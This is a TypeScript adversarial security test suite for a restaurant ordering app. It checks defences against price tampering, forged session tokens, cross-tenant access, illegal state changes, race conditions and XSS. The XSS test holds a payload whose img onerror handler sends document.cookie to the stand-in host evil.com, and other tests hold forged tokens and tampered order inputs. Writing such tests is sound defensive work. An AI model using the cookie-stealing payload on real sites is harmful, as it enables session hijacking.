/**
 * CEP GARSON — FAZ 12 FULL ADVERSARIAL SECURITY TEST SUITE
 * Validates Zero-Trust Invariants, Actor Threat Models, Token Forgery, IDOR, Financial Fraud, and Combination Attacks
 */

import fs from "fs";
import path from "path";
import crypto from "crypto";

// Load environment variables from .env.local
try {
  const envPath = path.resolve(process.cwd(), ".env.local");
  if (fs.existsSync(envPath)) {
    if (typeof (process as any).loadEnvFile === "function") {
      (process as any).loadEnvFile(envPath);
    } else {
      const content = fs.readFileSync(envPath, "utf8");
      for (const line of content.split("\n")) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith("#") && trimmed.includes("=")) {
          const idx = trimmed.indexOf("=");
          const key = trimmed.slice(0, idx).trim();
          let val = trimmed.slice(idx + 1).trim();
          if (val.startsWith("'") && val.endsWith("'")) val = val.slice(1, -1);
          if (val.startsWith('"') && val.endsWith('"')) val = val.slice(1, -1);
          process.env[key] = val;
        }
      }
    }
  }
} catch {
  // Continue with existing process.env
}

import { getAdminDb } from "../../src/lib/firebase/admin";
import {
  calculateAndCreateCanonicalOrder,
  CreateOrderRequestInput,
  toMinorUnits,
  fromMinorUnits,
} from "../../src/lib/restaurant/canonicalOrderEngine";
import {
  createTableSession,
  validateTableSession,
  verifySessionTokenSignature,
  invalidateAllTableSessions,
} from "../../src/lib/restaurant/session";
import {
  assertTableOwnership,
  assertOrderOwnership,
  assertMenuItemOwnership,
  assertSessionOwnership,
} from "../../src/lib/restaurant/tenantGuard";
import {
  verifySessionToken,
  authenticateStaffWithPin,
} from "../../src/lib/auth/restaurantAuth";
import {
  validateOrderStateTransition,
  validatePaymentTransition,
} from "../../src/lib/restaurant/stateMachine";
import { sanitizeHtmlContent } from "../../src/lib/validation/schemas";
import { DEMO_RESTAURANT, DEMO_MENU_ITEMS, DEMO_TABLES } from "../../src/lib/restaurant/mockData";
import { Order, Table, OrderItem } from "../../src/types/restaurant";

function assert(condition: boolean, message: string) {
  if (!condition) {
    throw new Error(`[ASSERTION FAILED]: ${message}`);
  }
}

function assertEqual(actual: any, expected: any, message: string) {
  if (actual !== expected) {
    throw new Error(`[ASSERTION FAILED]: ${message} — Expected: ${expected}, Got: ${actual}`);
  }
}

async function main() {
  console.log("=================================================");
  console.log("RUNNING FAZ 12 COMPREHENSIVE ADVERSARIAL SECURITY TESTS");
  console.log("=================================================\n");

  const db = getAdminDb();
  const testRunId = `adv12_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
  const testDocRef = db.doc(`_internal/production-readiness-tests/faz12-adversarial/${testRunId}`);

  console.log(`Cloud Project        : cep-garson-prod`);
  console.log(`Test Namespace Scope : _internal/production-readiness-tests/faz12-adversarial`);
  console.log(`Test Document ID     : ${testRunId}\n`);

  const REST_A = "rest_aura_bistro";
  const REST_B = "rest_rival_cafe";

  // =========================================================================
  // 1. ZERO TRUST ON CLIENT PRICE & FINANCIAL TAMPERING
  // =========================================================================
  console.log("--- 1. ZERO TRUST CLIENT FINANCIAL MANIPULATION ---");
  const session1 = createTableSession(REST_A, "m-4", "Masa 4", "dev_fingerprint_1", 15);

  const maliciousPayload: CreateOrderRequestInput = {
    restaurantId: REST_A,
    tableId: "m-4",
    sessionToken: session1.token,
    items: [
      {
        menuItemId: "item_truffle_burger", // Real price is 360 TL
        quantity: 2,
        // Attacker injects fake prices
        price: 1.0,
        unitPrice: 0.01,
        finalPrice: -100,
        total: 2.0,
      } as any,
    ],
  };

  const canonicalResult = calculateAndCreateCanonicalOrder(maliciousPayload);
  assert(canonicalResult.ok, "Canonical engine successfully processed order input");
  const order = canonicalResult.order!;
  assertEqual(order.subtotal, 720, "Server-side canonical price 360 * 2 = 720 TL applied (client prices 100% ignored)");
  assertEqual(order.items[0].finalPrice, 360, "Item price is canonical 360 TL");
  console.log("  [PASS] Adv 1: Client Price Tampering Injected (-100 TL / 1 TL) -> Server Enforces Canonical 720 TL");

  // =========================================================================
  // 2. HMAC SESSION TOKEN FORGERY & SIGNATURE VERIFICATION
  // =========================================================================
  console.log("--- 2. HMAC SESSION TOKEN FORGERY & REPLAY DEFENSE ---");
  const legitToken = session1.token;
  assert(verifySessionTokenSignature(legitToken), "Legitimate session token HMAC signature is valid");

  // Attacker crafts forged token
  const fakeToken = Buffer.from("rest_aura_bistro:m-4:dev_attacker:1787330000:forged.fake_signature").toString("base64url");
  assert(!verifySessionTokenSignature(fakeToken), "Forged session token rejected by HMAC verification");

  const tamperedValidation = validateTableSession(fakeToken, REST_A, "m-4");
  assert(!tamperedValidation.valid, "Forged token rejected by validateTableSession");
  console.log("  [PASS] Adv 2: Cryptographic Token Forgery Blocked (HMAC-SHA256 Verification Enforced)");

  // =========================================================================
  // 3. CLOSED SESSION RESURRECTION ATTACK
  // =========================================================================
  console.log("--- 3. OLD SESSION RESURRECTION PREVENTION ---");
  const sessionToClose = createTableSession(REST_A, "m-1", "Masa 1", "dev_guest_1", 15);
  const closedToken = sessionToClose.token;

  // Invalidate table sessions on cashier close
  invalidateAllTableSessions(REST_A, "m-1");

  const attemptResult = calculateAndCreateCanonicalOrder({
    restaurantId: REST_A,
    tableId: "m-1",
    sessionToken: closedToken,
    items: [{ menuItemId: "item_truffle_burger", quantity: 1 }],
  });

  assert(!attemptResult.ok, "Order with closed session token is rejected");
  assertEqual(attemptResult.errorCode, "SESSION_INVALID", "Error code is SESSION_INVALID");
  console.log("  [PASS] Adv 3: Closed Session Resurrection Blocked (Stale Tokens Cannot Order)");

  // =========================================================================
  // 4. CROSS-TENANT & CROSS-TABLE IDOR ATTACKS
  // =========================================================================
  console.log("--- 4. CROSS-TENANT & CROSS-TABLE IDOR ISOLATION ---");
  const crossTenantAttempt = calculateAndCreateCanonicalOrder({
    restaurantId: REST_B, // Attacking rival restaurant
    tableId: "m-4",
    sessionToken: session1.token, // Token belonging to REST_A
    items: [{ menuItemId: "item_truffle_burger", quantity: 1 }],
  });

  assert(!crossTenantAttempt.ok, "Cross-tenant order attempt rejected");

  const crossTenantOrder: Order = {
    id: "ord_from_rest_a",
    restaurantId: REST_A,
    tableId: "m-4",
    tableNumber: "Masa 4",
    sessionToken: session1.token,
    status: "PREPARING",
    items: [],
    subtotal: 360,
    taxAmount: 36,
    serviceCharge: 0,
    totalAmount: 360,
    paymentStatus: "PENDING",
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  const guardResult = assertOrderOwnership(REST_B, crossTenantOrder);
  assert(!guardResult.allowed, "TenantGuard blocks unauthorized cross-tenant order access");
  console.log("  [PASS] Adv 4: Cross-Tenant IDOR Attack Blocked (Tenant Isolation Guard Enforced)");

  // =========================================================================
  // 5. STATE MACHINE FORBIDDEN TRANSITIONS & REVERSE BYPASS
  // =========================================================================
  console.log("--- 5. STATE MACHINE FORBIDDEN TRANSITIONS ---");
  assert(!validateOrderStateTransition("SERVED", "PREPARING").valid, "Reverse transition SERVED -> PREPARING blocked");
  assert(!validateOrderStateTransition("COMPLETED", "READY").valid, "Reverse transition COMPLETED -> READY blocked");
  assert(!validateOrderStateTransition("CANCELLED", "SERVED").valid, "Transition CANCELLED -> SERVED blocked");
  assert(!validatePaymentTransition("PAID_CASHIER", "PENDING").valid, "Reverse transition PAID_CASHIER -> PENDING blocked");
  console.log("  [PASS] Adv 5: Order State Machine Invariant Protected (Zero Illegal State Transitions)");

  // =========================================================================
  // 6. XSS & HTML INJECTION IN USER-CONTROLLED FIELDS
  // =========================================================================
  console.log("--- 6. XSS & POLYMORPHIC INJECTION DEFENSE ---");
  const maliciousXss = `<script>alert('pwned')</script><img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)"><b>Afiyet Olsun</b>`;
  const sanitized = sanitizeHtmlContent(maliciousXss);
  assert(!sanitized.includes("<script>"), "Script tag eliminated from user input");
  assert(!sanitized.includes("onerror"), "Inline event handler eliminated from user input");
  console.log("  [PASS] Adv 6: XSS Injection Sanitized (Zero Script/Event Execution in User Content)");

  // =========================================================================
  // 7. REAL CLOUD FIRESTORE ATOMIC TRANSACTION CONCURRENCY & INTEGRITY
  // =========================================================================
  console.log("--- 7. LIVE CLOUD FIRESTORE ADVERSARIAL CONCURRENCY ---");
  await testDocRef.set({
    version: 1,
    orders: [],
    tables: [
      { id: "m-4", restaurantId: REST_A, tableNumber: "Masa 4", capacity: 6, status: "OCCUPIED", activeBillTotal: 0 },
    ],
    sharedCarts: { "m-4": [] },
    tableParticipants: { "m-4": [] },
    inventory: { item_truffle_burger: 5 },
    lastUpdated: Date.now(),
  });

  // Concurrent Stock Decrement Simulation (5 stock, 6 simultaneous buyers)
  const buyAttempts = Array.from({ length: 6 }, (_, idx) => idx);
  let successfulBuys = 0;
  let rejectedBuys = 0;

  await Promise.all(
    buyAttempts.map(async (buyerIdx) => {
      try {
        await db.runTransaction(async (tx) => {
          const snap = await tx.get(testDocRef);
          const data = snap.data() || {};
          const currentStock = data.inventory?.item_truffle_burger || 0;
          if (currentStock < 1) {
            throw new Error("OUT_OF_STOCK");
          }
          tx.update(testDocRef, {
            "inventory.item_truffle_burger": currentStock - 1,
            version: (data.version || 1) + 1,
            lastUpdated: Date.now(),
          });
        });
        successfulBuys++;
      } catch (err: any) {
        if (err.message === "OUT_OF_STOCK") {
          rejectedBuys++;
        }
      }
    })
  );

  assertEqual(successfulBuys, 5, "Exactly 5 buyers succeeded when stock was 5");
  assertEqual(rejectedBuys, 1, "Exactly 1 buyer was rejected (0 negative inventory)");

  const finalSnap = await testDocRef.get();
  assertEqual(finalSnap.data()?.inventory?.item_truffle_burger, 0, "Final stock is exactly 0");
  console.log("  [PASS] Adv 7: Concurrent Stock Race Attack Blocked (ACID Atomic Decrement: 5 Buys, 1 Reject, Stock = 0)");

  // =========================================================================
  // 8. COMBINATION ATTACK (QR Photo + Old Session + DevTools Tampered Cart)
  // =========================================================================
  console.log("--- 8. COMBINATION ATTACK DEFENSE ---");
  const combSession = createTableSession(REST_A, "m-4", "Masa 4", "dev_legit", 15);
  invalidateAllTableSessions(REST_A, "m-4"); // Table closed

  const combinationAttackInput: CreateOrderRequestInput = {
    restaurantId: REST_A,
    tableId: "m-4",
    sessionToken: combSession.token, // Old closed token
    items: [
      {
        menuItemId: "item_truffle_burger",
        quantity: -5, // Negative quantity
        price: 0,
      } as any,
    ],
  };

  const combResult = calculateAndCreateCanonicalOrder(combinationAttackInput);
  assert(!combResult.ok, "Combination attack rejected by multiple defense layers");
  console.log("  [PASS] Adv 8: Multi-Vector Combination Attack Blocked (Session + Quantity + Price Invariants Upheld)");

  // CLEANUP
  await testDocRef.delete();
  console.log("  [PASS] Teardown: Non-Destructive Cloud Test Cleanup Completed");

  console.log("\n=================================================");
  console.log("ALL FAZ 12 ADVERSARIAL SECURITY TESTS PASSED (100% SUCCESS)");
  console.log("=================================================\n");
}

main().catch((err) => {
  console.error("\n[FATAL ERROR IN FAZ 12 ADVERSARIAL SUITE]:", err);
  process.exit(1);
});
